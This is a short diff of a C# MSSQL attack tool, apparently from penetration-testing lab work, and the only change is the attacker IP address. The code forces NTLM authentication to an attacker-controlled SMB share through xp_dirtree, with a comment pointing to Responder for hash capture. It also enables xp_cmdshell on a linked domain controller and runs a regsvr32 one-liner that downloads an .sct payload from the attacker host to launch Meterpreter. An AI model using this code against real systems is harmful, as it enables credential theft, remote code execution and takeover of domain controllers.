@@ -66,7 +66,7 @@ namespace MSSQL
 			getGroupMembership("sysadmin", con);
 
 			// Force NTLM authentication for hash-grabbing or relaying
-			String targetShare = "\\\\192.168.49.67\\share";//通用命名約定 (UNC) 路徑
+			String targetShare = "\\\\192.168.45.153\\share";//通用命名約定 (UNC) 路徑
 			String res = executeQuery($"EXEC master..xp_dirtree \"{targetShare}\";", con);
 			Console.WriteLine($"[*] Forced authentication to '{targetShare}'.");//responser打爆破(sudo responder -I tun0)
 
@@ -124,7 +124,7 @@ namespace MSSQL
 			Console.WriteLine($"[*] Enabled advanced options on DC01.");
 			res = executeQuery("select 1 from openquery(\"dc01\", 'select 1; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure')", con);
 			Console.WriteLine($"[*] Enabled xp_cmdshell options on DC01.");
-			res = executeQuery("select 1 from openquery(\"dc01\", 'select 1; exec xp_cmdshell ''regsvr32 /s /n /u /i:http://192.168.49.67:8080/F0t6R5A.sct scrobj.dll''')", con);
+			res = executeQuery("select 1 from openquery(\"dc01\", 'select 1; exec xp_cmdshell ''regsvr32 /s /n /u /i:http://192.168.45.153:8080/F0t6R5A.sct scrobj.dll''')", con);
 			Console.WriteLine($"[*] Triggered Meterpreter oneliner on DC01. Check your listener!");
 
 			// Escalate via double database linkedString su = executeQuery("SELECT SYSTEM_USER;", con);
